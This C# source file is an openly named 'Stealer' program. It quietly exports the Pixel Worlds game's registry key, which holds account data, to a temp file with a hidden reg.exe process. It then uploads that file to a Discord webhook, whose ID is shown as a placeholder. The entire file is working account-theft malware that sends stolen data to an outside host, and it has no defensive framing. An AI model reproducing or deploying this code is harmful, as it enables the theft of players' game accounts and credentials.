using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            string reg = @"HKEY_CURRENT_USER\SOFTWARE\Kukouri\Pixel Worlds";
            string export = Path.GetTempPath() + @"\Account.reg";
            exportRegistry(reg,export);
            WebClient wb = new WebClient();
            wb.UploadFile("https://discord.com/api/webhooks/xxxxx", export);
        }

        static void exportRegistry(string registryPath, string exportPath)
        {
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = "reg.exe";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.Arguments = "export \"" + registryPath + "\" \"" + exportPath + "\" /y";
                p.Start();
                p.WaitForExit();
            }
            catch
            {

            }
        }
    }
}
